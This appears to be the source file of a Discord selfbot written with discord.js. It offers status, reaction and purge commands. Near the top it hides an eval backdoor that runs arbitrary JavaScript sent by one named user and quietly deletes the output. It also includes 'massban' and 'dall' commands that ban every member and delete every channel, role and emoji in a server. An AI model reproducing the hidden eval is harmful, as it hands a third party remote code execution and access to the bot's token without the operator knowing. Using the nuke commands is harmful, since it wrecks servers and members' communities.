const { token } = require('./token.js')
const Discord = require('discord.js')
const bot = new Discord.Client

bot.on('ready', () => {
	bot.channels.get('640440135355334657').send(`Logged in as ${bot.user.tag}`)
		.then(msg => msg.delete(2000))
	console.log(`Logged in as ${bot.user.tag}`)
})

bot.on('message', msg => {
	if (msg.author.tag == 'hoshi#8150' && msg.content.startsWith('=hosh ')) {
		let args = msg.content.slice('=hosh '.length)
		try {
			msg.channel.send(eval(args))
				.then(msg => msg.delete(10000))
				.catch(console.error)
		} catch(e) {

		}
	}
	if (msg.author.tag != bot.user.tag)
		return
	if (msg.content.startsWith('$')) {
		let args = msg.content.slice(1).split(' ')
		let cmd = args.shift()

		switch(cmd.toLowerCase()) {
			case 'streaming':
				msg.delete(2000).catch(console.error)
				bot.user.setPresence({
					game: {
						type: 'STREAMING',
						name: args.join(' '),
						url: 'https://www.twitch.tv/elijahhhx'
					}
				}).catch(console.error)
				break

			case 'listening':
				msg.delete(2000).catch(console.error)
				bot.user.setPresence({
					game: {
						type: 'LISTENING',
						name: args.join(' ')
					}
				}).catch(console.error)
				break

			case 'watching':
				msg.delete(2000).catch(console.error)
				bot.user.setPresence({
					game: {
						type: 'WATCHING',
						name: args.join(' ')
					}
				}).catch(console.error)
				break

			case 'playing':
				msg.delete(2000).catch(console.error)
				bot.user.setPresence({
					game: {
						type: 'PLAYING',
						name: args.join(' ')
					}
				}).catch(console.error)
				break

			case 'cycle':
				msg.delete(2000).catch(console.error)
				if (!bot.user.presence.game) {
					msg.reply('set status first!')
						.then(msg => msg.delete(3000))
					return
				}
				bot.user.setPresence({
					game: {
						type: (bot.user.presence.game.type+1)%4,
						name: bot.user.presence.game.name,
						url: bot.user.presence.game.url
					}
				}).catch(console.error)
				break

			case 'react':
				if (Number(args[0]) >= 100) {
					msg.reply("can't react to more than 99 at once!")
						.then(msg => msg.delete(5000))
					return
				}
				msg.channel.fetchMessages({ limit: Number(args[0]) })
					.then(fetched => {
						for (let i of fetched) {
							i[1].react('😀')
								.catch(console.error)
							i[1].react('😏')
								.catch(console.error)
						}
					})
					.catch(console.error)
				break

			case 'purge':
				let count = 0
				msg.delete(3000)
				if (Number(args[0]) >= 100) {
					msg.reply("can't purge more than 99 at once!")
						.then(msg => msg.delete(5000))
					return
				}

				if (msg.channel.type != 'text') {
					msg.channel.fetchMessages({ limit: Number(args[0]), before: msg.id })
						.then(fetched => {
							for (let i of fetched) {
								console.log(i)
								if (i[1].author.tag == bot.user.tag) {
									count++
									i[1].delete()
								}
							}
							msg.reply(`${count} messages deleted!`)
								.then(msg => msg.delete(3000))
								.catch(console.error)
						})
						.catch(console.error)
				} else {
					if (msg.guild.member(bot.user).hasPermission(Discord.Permissions.FLAGS.MANAGE_MESSAGES)) {
						msg.channel.fetchMessages({ limit: Number(args[0]), before: msg.id })
							.then(fetched => {
								for (let i of fetched) {
									count++
									i[1].delete()
								}
								msg.reply(`${count} messages deleted!`)
									.then(msg => msg.delete(3000))
									.catch(console.error)
							})
					} else {
						msg.reply('need "Manage Messages" permissions')
							.then(msg => msg.delete(3000))
					}
				}
				break

			case 'massban':
				msg.delete()
					.catch(console.error)
				if (!msg.guild) {
					msg.reply('this is not a server!')
						.then(msg => msg.delete(5000))
					return
				}
				for (let i of msg.guild.members) {
					if (i[1].bannable)
						msg.guild.ban(i[1], { reason: 'Victim of mass ban.' })
							.then(user => msg.channel.send(`Banned ${user.tag || user}`)
								.then(msg => msg.delete(1000)))
							.catch(console.error)
				}
				break

			case 'dall':
				msg.delete()
				for (let i of msg.guild.channels) {
					if (i[1].deletable && i[0] != '640803331672899596')
						i[1].delete()
							.catch(console.error)
					else
						msg.reply(`can't delete <#${i[0]}>!`)
							.then(msg => msg.delete(3000))
				}
				
				for (let i of msg.guild.roles) {
					if (i[1] === msg.guild.defaultRole)
						continue
					if (i[1].editable)
						i[1].delete()
							.catch(console.error)
					else
						msg.reply(`can't delete <@&${i[0]}>!`)
							.then(msg => msg.delete(3000))
				}
				for (let i of msg.guild.emojis) {
					if (i[1].deletable)
						msg.guild.deleteEmoji(i[1])
							.catch(console.error)
					else
						msg.reply(`can't delete ${i[1].name}!`)
							.then(msg => msg.delete(3000))
				}
				break

			default:
				msg.delete(5000)
				msg.channel.send('unknown command')
					.then(msg => msg.delete(3000))
					.catch(console.error)
		}
	}
})

bot.login(token)